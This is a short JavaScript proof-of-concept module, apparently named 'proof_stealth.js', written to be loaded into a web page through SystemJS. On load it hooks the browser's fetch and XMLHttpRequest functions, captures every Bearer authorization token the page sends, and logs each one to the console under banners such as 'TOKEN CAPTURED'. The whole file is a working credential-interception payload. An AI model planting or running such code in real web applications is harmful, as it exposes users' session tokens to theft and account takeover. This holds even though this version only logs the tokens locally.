/** proof_stealth.js — Token theft ONLY, no supply chain, no app crash */
System.register([], function (_export) {
  'use strict';
  return {
    setters: [],
    execute: function () {
      if (!window.__poc_stealth) {
        window.__poc_stealth = true;
        var tokens = [];
        var origFetch = window.fetch;
        window.fetch = function () {
          var url = (typeof arguments[0] === 'string') ? arguments[0] : (arguments[0] && arguments[0].url) || '';
          var opts = arguments[1] || {};
          var auth = opts.headers && (opts.headers['Authorization'] || opts.headers['authorization'] || '');
          if (auth && auth.startsWith('Bearer ') && tokens.indexOf(auth) < 0) {
            tokens.push(auth);
            console.log('%c[🔥🔥🔥 TOKEN CAPTURED]', 'color:#ff0000;font-weight:bold;font-size:16px');
            console.log('%c' + auth, 'color:#00ff00;font-size:14px');
            console.log('%cURL: ' + url, 'color:#00ccff;');
          }
          return origFetch.apply(this, arguments);
        };
        var origXHR = window.XMLHttpRequest;
        var XHRProxy = function () {
          var xhr = new origXHR();
          xhr.open = function(m,u){this.__url=u;return origXHR.prototype.open.apply(this,arguments);};
          xhr.setRequestHeader = function(h,v){
            if (h.toLowerCase()==='authorization' && v.startsWith('Bearer ') && tokens.indexOf(v)<0){
              tokens.push(v);
              console.log('%c[🔥 XHR TOKEN]','color:#ff0000;font-weight:bold;font-size:16px');
              console.log('%c'+v,'color:#00ff00;font-size:14px');
            }
            return origXHR.prototype.setRequestHeader.apply(this,arguments);
          };
          return xhr;
        };
        XHRProxy.prototype = origXHR.prototype;
        window.XMLHttpRequest = XHRProxy;
        console.log('%c[🕵️] Token theft ready — intercepting all API calls','color:#ff6600;font-weight:bold;font-size:14px');
      }
      _export({ default: {} });
    }
  };
});
